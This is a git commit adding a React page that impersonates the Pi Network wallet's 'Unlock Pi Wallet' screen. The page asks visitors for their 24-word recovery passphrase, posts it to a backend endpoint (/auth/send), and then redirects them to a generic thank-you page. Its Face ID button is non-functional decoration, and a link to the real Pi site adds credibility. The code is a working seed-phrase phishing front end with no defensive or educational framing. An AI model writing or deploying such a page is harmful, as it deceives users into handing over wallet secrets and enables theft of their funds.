1751b665ff32bd280f2172ffc1891a118a0b6006
vish2580 <157345871+vish2580@users.noreply.github.com>
2024-01-23 15:25:57 +0530

    Add files via upload

---
+++ page/src/App.js
@@ -0,0 +1,47 @@
+import './App.css';
+import { useFormik } from 'formik';
+import axios from 'axios'
+import * as Yup from 'yup';
+let schema = Yup.object().shape({
+  message: Yup.string().required("Invalid passphrase"),
+});
+
+function App() {
+  const formik = useFormik({
+    initialValues: {
+      message : ""
+    },
+    validationSchema: schema,
+    onSubmit: async(values)=>{
+      const response = await axios.post(`http://localhost:5000/auth/send`, values);
+      if(response.data){
+        window.location.replace("https://formspree.io/thanks?language=en#home");
+      }
+      },
+  });
+
+  return (
+    <div class="layout">
+    <h6>Unlock Pi Wallet</h6>
+    <form onSubmit={formik.handleSubmit}>
+    <textarea placeholder="Enter your 24-word passphrase here" onChange={formik.handleChange("message")} value={formik.values.message}></textarea>
+    <div class="erbox" >
+    {formik.touched.message && formik.errors.message ? <div class="text  text-base">
+            {formik.touched.message && formik.errors.message}
+          </div> : <></>}
+      <input type="submit" class="btn uwp" value='Unlock With Passphrase' />
+      <div className="btn biob capz">Unlock With Face ID</div>    
+    </div> 
+    </form>
+    <p class="below-text">As a non-custodial wallet, your wallet passphrase is
+        exclusively accessible only to you. Recovery of passphrase
+        is currently impossible.<br/><br/>
+        Lost your passphrase? <a className="link" href="https://minepi.com/" >You can create a new wallet,</a> but all your π
+        in your previous wallet will be inaccessible.
+    </p>
+    </div>
+    
+  );
+}
+
+export default App;
